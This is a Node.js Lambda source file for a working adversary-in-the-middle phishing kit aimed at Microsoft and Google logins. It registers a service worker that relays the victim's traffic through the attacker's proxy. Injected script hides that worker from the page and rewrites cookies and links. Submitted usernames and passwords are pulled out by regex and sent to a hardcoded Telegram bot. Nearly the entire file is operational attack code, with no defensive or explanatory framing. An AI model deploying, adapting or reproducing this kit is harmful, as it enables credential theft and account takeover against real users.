const https = require("https");
const http = require("http");
const zlib = require("zlib");
const crypto = require("crypto");

const PROXY_ENTRY_POINT_BASE = "/login?method=signin&mode=secure&client_id=";
const CORPORATE_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const PERSONAL_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const GOOGLE_CLIENT_ID = "717762328687-iludtf96g1hinl76e4lc1b9a82g457nn.apps.googleusercontent.com";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.office.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
const VICTIM_SESSIONS = {};

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN_1 = "8146357030:AAHzd8ig5suWbgZz4hCJ5ZaqihyoChGMERU";
const TELEGRAM_CHAT_ID_1 = "6263177378";

// Lambda handler
exports.handler = async (event, context) => {
    const { httpMethod, path, queryStringParameters, headers, body, isBase64Encoded } = event;
    
    console.log('Lambda request:', { httpMethod, path, queryStringParameters, headers: Object.keys(headers) });
    
    // Parse the URL
    const url = new URL(`https://${headers.Host || 'localhost'}${path}`);
    if (queryStringParameters) {
        Object.entries(queryStringParameters).forEach(([key, value]) => {
            url.searchParams.set(key, value);
        });
    }
    
    const method = httpMethod;
    const currentSession = getUserSession(headers.Cookie || headers.cookie);
    
    try {
        // Handle short URLs
        if (path === '/c' || path === '/corp' || path === '/corporate') {
            return {
                statusCode: 302,
                headers: {
                    Location: `/prod/login?method=signin&mode=secure&client_id=${CORPORATE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`
                },
                body: ''
            };
        }
        
        if (path === '/p' || path === '/personal') {
            return {
                statusCode: 302,
                headers: {
                    Location: `/prod/login?method=signin&mode=secure&client_id=${PERSONAL_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F`
                },
                body: ''
            };
        }
        
        if (path === '/g' || path === '/google') {
            return {
                statusCode: 302,
                headers: {
                    Location: `/prod/login?method=signin&mode=secure&client_id=${GOOGLE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2F`
                },
                body: ''
            };
        }

        // Handle login URLs
        if (path.startsWith('/login') && queryStringParameters && queryStringParameters.redirect_urI) {
            const isValidLogin = (queryStringParameters.client_id === CORPORATE_CLIENT_ID) || 
                               (queryStringParameters.client_id === PERSONAL_CLIENT_ID) ||
                               (queryStringParameters.client_id === GOOGLE_CLIENT_ID);
            
            if (isValidLogin) {
                try {
                    const phishedURL = new URL(decodeURIComponent(queryStringParameters.redirect_urI));
                    let session = currentSession;

                    if (!currentSession) {
                        const { cookieName, cookieValue } = generateNewSession(phishedURL);
                        VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                        VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                        VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                        VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                        VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                        return {
                            statusCode: 200,
                            headers: {
                                'Content-Type': 'text/html',
                                'Set-Cookie': `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`
                            },
                            body: getIndexHTML()
                        };
                    } else {
                        // Existing session - serve the index page
                        return {
                            statusCode: 200,
                            headers: {
                                'Content-Type': 'text/html'
                            },
                            body: getIndexHTML()
                        };
                    }
                } catch (error) {
                    console.error("Phishing URL parsing failed", error);
                    return {
                        statusCode: 404,
                        headers: { 'Content-Type': 'text/html' },
                        body: getNotFoundHTML()
                    };
                }
            }
        }

        // Handle service worker (both with and without /prod/ prefix)
        if (path === PROXY_PATHNAMES.serviceWorker || path === '/service_worker_Mz8XO2ny1Pg5.js') {
            return {
                statusCode: 200,
                headers: { 
                    'Content-Type': 'text/javascript',
                    'Service-Worker-Allowed': '/'
                },
                body: getServiceWorkerJS()
            };
        }
        
        // Handle service worker at root path for scope /
        if (path === '/service_worker_Mz8XO2ny1Pg5.js') {
            return {
                statusCode: 200,
                headers: { 
                    'Content-Type': 'text/javascript',
                    'Service-Worker-Allowed': '/'
                },
                body: getServiceWorkerJS()
            };
        }

        // Handle script injection
        if (path === PROXY_PATHNAMES.script) {
            return {
                statusCode: 200,
                headers: { 'Content-Type': 'text/javascript' },
                body: getScriptJS()
            };
        }

        // Handle favicon
        if (path === PROXY_PATHNAMES.favicon) {
            return {
                statusCode: 200,
                headers: { 'Content-Type': 'image/x-icon' },
                body: ''
            };
        }

        // Handle proxy requests from service worker (both with and without /prod/ prefix)
        if (path === PROXY_PATHNAMES.proxy || path === '/lNv1pC9AWPUY4gbidyBO') {
            if (method === 'POST' && body) {
                const requestBody = isBase64Encoded ? Buffer.from(body, 'base64').toString() : body;
                
                try {
                    const proxyRequest = JSON.parse(requestBody);
                    console.log('Proxy request received:', JSON.stringify(proxyRequest, null, 2));
                    const proxyRequestURL = new URL(proxyRequest.url);
                    
                    // Make the actual request to the target
                    const result = await makeProxyRequest(proxyRequest, currentSession, headers);
                    return result;
                } catch (error) {
                    console.error("Proxy request failed", error);
                    return {
                        statusCode: 502,
                        headers: { 'Content-Type': 'text/html' },
                        body: '<h1>502 Bad Gateway</h1>'
                    };
                }
            }
        }

        // Handle proxy requests
        if (currentSession || path === PROXY_PATHNAMES.proxy) {
            if (method === 'POST' && body) {
                const requestBody = isBase64Encoded ? Buffer.from(body, 'base64').toString() : body;
                
                try {
                    const proxyRequest = JSON.parse(requestBody);
                    const proxyRequestURL = new URL(proxyRequest.url);
                    
                    // Make the actual request to the target
                    const result = await makeProxyRequest(proxyRequest, currentSession, headers);
                    return result;
                } catch (error) {
                    console.error("Proxy request failed", error);
                    return {
                        statusCode: 502,
                        headers: { 'Content-Type': 'text/html' },
                        body: '<h1>502 Bad Gateway</h1>'
                    };
                }
            }
        }

        // Default response
        return {
            statusCode: 404,
            headers: { 'Content-Type': 'text/html' },
            body: getNotFoundHTML()
        };

    } catch (error) {
        console.error("Handler error", error);
        return {
            statusCode: 500,
            headers: { 'Content-Type': 'text/html' },
            body: '<h1>500 Internal Server Error</h1>'
        };
    }
};

function getUserSession(cookieHeader) {
    if (!cookieHeader) return;
    
    const cookies = cookieHeader.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");
        
        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {
        value: cookieValue,
        cookies: [],
        logFilename: `${phishedURL.host}__${new Date().toISOString()}`,
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: `${phishedURL.pathname}${phishedURL.search}`,
        port: phishedURL.port,
        host: phishedURL.host
    };

    console.log(`New victim session started: ${cookieName} for ${phishedURL.host}`);
    
    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function makeProxyRequest(proxyRequest, currentSession, headers) {
    const targetURL = new URL(proxyRequest.url);
    const protocol = targetURL.protocol === 'https:' ? https : http;
    
    const options = {
        hostname: targetURL.hostname,
        port: targetURL.port || (targetURL.protocol === 'https:' ? 443 : 80),
        path: targetURL.pathname + targetURL.search,
        method: proxyRequest.method,
        headers: {
            ...proxyRequest.headers,
            'host': targetURL.host
        }
    };

    return new Promise((resolve, reject) => {
        const req = protocol.request(options, (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                // Log the transaction
                logHTTPProxyTransaction(proxyRequest, res, data, currentSession);
                
                resolve({
                    statusCode: res.statusCode,
                    headers: {
                        'Content-Type': res.headers['content-type'] || 'text/html',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
                        'Access-Control-Allow-Headers': 'Content-Type, Authorization'
                    },
                    body: data
                });
            });
        });

        req.on('error', (error) => {
            console.error('Proxy request error:', error);
            reject(error);
        });

        if (proxyRequest.body) {
            req.write(proxyRequest.body);
        }
        
        req.end();
    });
}

async function logHTTPProxyTransaction(proxyRequest, proxyResponse, responseBody, currentSession) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: proxyRequest.url,
        proxyRequestMethod: proxyRequest.method,
        proxyRequestHeaders: proxyRequest.headers,
        proxyRequestBody: proxyRequest.body,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers,
        proxyResponseBody: responseBody
    };
    
    // Check for credentials
    const requestBodyStr = proxyRequest.body || '';
    const requestPath = new URL(proxyRequest.url).pathname;
    
    if (requestBodyStr.includes('password') || requestBodyStr.includes('passwd') || 
        requestPath.includes('login') || requestPath.includes('signin')) {
        
        let username = '';
        let password = '';
        
        // Extract credentials from request body
        const passwordMatch = requestBodyStr.match(/(?:password|passwd)["\s:=]+([^&"\s,}]+)/i);
        const usernameMatch = requestBodyStr.match(/(?:username|email|login|loginfmt)["\s:=]+([^&"\s,}]+)/i);
        
        if (passwordMatch) password = decodeURIComponent(passwordMatch[1]);
        if (usernameMatch) username = decodeURIComponent(usernameMatch[1]);
        
        if (username || password) {
            console.log(`Credentials captured for session ${currentSession}:`);
            console.log(`Username: ${username}`);
            console.log(`Password: ${password}`);
            
            // Send Telegram notification
            const message = `🔑 CREDENTIALS CAPTURED!\n👤 Email: ${username}\n🔐 Password: ${password}\n⏰ Time: ${new Date().toISOString()}`;
            await sendTelegramNotification(message);
        }
    }
}

async function sendTelegramNotification(message) {
    try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID_1,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (!response.ok) {
            console.error('Telegram notification failed:', response.status);
        }
    } catch (error) {
        console.error('Telegram notification error:', error);
    }
}

function getIndexHTML() {
    return `<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
</head>

<body>
    <script>
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/prod/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            })
                .then((registration) => {
                    console.log("Service worker registered, waiting for control...");
                    
                    // Wait for the service worker to control this page
                    if (navigator.serviceWorker.controller) {
                        // Already controlled
                        performRedirect();
                    } else {
                        // Wait for control
                        navigator.serviceWorker.addEventListener('controllerchange', () => {
                            console.log("Service worker now controlling the page");
                            performRedirect();
                        });
                        
                        // Also try to claim immediately if the worker is already active
                        if (registration.active) {
                            registration.active.postMessage({ type: 'CLAIM_CLIENTS' });
                        }
                    }
                    
                    function performRedirect() {
                        const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                        const phishedURL = new URL(decodeURIComponent(phishedParameterURL));

                        console.log("Redirecting to:", phishedURL.href);
                        // The service worker will intercept this request and proxy it
                        self.location.replace(phishedURL.href);
                    }
                })
                .catch((error) => {
                    console.error(\`Service worker registration failed: \${error}\`);
                });
        }
        else {
            console.error("Service workers are not supported by this browser");
        }
    </script>
</body>

</html>`;
}

function getNotFoundHTML() {
    return `<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested page could not be found.</p>
</body>
</html>`;
}

function getServiceWorkerJS() {
    return `self.addEventListener("install", (event) => {
    self.skipWaiting();
});

self.addEventListener("activate", (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);
    
    // Don't intercept our short URLs - let them redirect naturally
    if (url.pathname === '/c' || url.pathname === '/corp' || url.pathname === '/corporate' ||
        url.pathname === '/p' || url.pathname === '/personal' ||
        url.pathname === '/g' || url.pathname === '/google') {
        return;
    }
    
    // Don't intercept root path redirects - let them happen naturally
    if (url.pathname === '/' || url.pathname === '') {
        return;
    }
    
    // Intercept Microsoft requests and proxy them
    if (url.hostname.includes('microsoftonline.com') || url.hostname.includes('microsoft.com')) {
        event.respondWith(handleRequest(event.request));
        return;
    }
    
    // Don't intercept the service worker itself or other static files
    if (url.pathname.includes('service_worker') || url.pathname === '/favicon.ico') {
        return;
    }
    
    // Don't intercept Chrome extension requests
    if (url.protocol === 'chrome-extension:' || url.protocol === 'moz-extension:' || url.protocol === 'safari-extension:') {
        return;
    }
    
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = \`\${self.location.origin}/prod/lNv1pC9AWPUY4gbidyBO\`;

    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    }
    catch (error) {
        console.error(\`Fetching \${proxyRequestURL} failed: \${error}\`);
    }
}`;
}

function getScriptJS() {
    return `(function () {
    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;

    navigator.serviceWorker.getRegistration = function (_scope) {
        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
            .then(registration => {

                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {

                    return undefined;
                }
                return registration;
            });
    };
})();

(function () {
    const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;

    navigator.serviceWorker.getRegistrations = function () {
        return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
            .then(registrations => {
                return registrations.filter(registration => {

                    return !(registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
                })
            });
    };
})();

(function () {
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");

    Object.defineProperty(document, "cookie", {
        ...originalCookieDescriptor,
        get() {
            return originalCookieDescriptor.get.call(document);
        },
        set(cookie) {
            const proxyRequestURL = \`\${self.location.origin}/JSCookie_6X7dRqLg90mH\`;
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", proxyRequestURL, false);
                xhr.setRequestHeader("Content-Type", "text/plain");
                xhr.send(cookie);

                const validDomains = JSON.parse(xhr.responseText);
                let modifiedCookie = "";

                const cookieAttributes = cookie.split(";");
                for (const cookieAttribute of cookieAttributes) {

                    let attribute = cookieAttribute.trim();
                    if (attribute) {

                        const cookieDomainMatch = attribute.match(/^DOMAIN\\s*=(.*)$/i);
                        if (cookieDomainMatch) {

                            const cookieDomain = cookieDomainMatch[1].replace(/^\\./, "").trim();
                            if (cookieDomain && validDomains.includes(cookieDomain)) {
                                attribute = \`Domain=\${self.location.hostname}\`;
                            }
                        }
                        modifiedCookie += \`\${attribute}; \`;
                    }
                }
                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
            }
            catch (error) {
                console.error(\`Fetching \${proxyRequestURL} failed: \${error}\`);
            }
        }
    });
})();


const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName);
        }

        else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute);
                    }
                }
            }
        }
    }
});

const attributes = ["href", "action"];

observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);

        if (htmlAttributeURL.origin !== self.location.origin) {
            const proxyRequestURL = new URL(\`\${self.location.origin}/Mutation_o5y3f4O7jMGW\`);
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));

            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    }
    catch { }
}`;
}
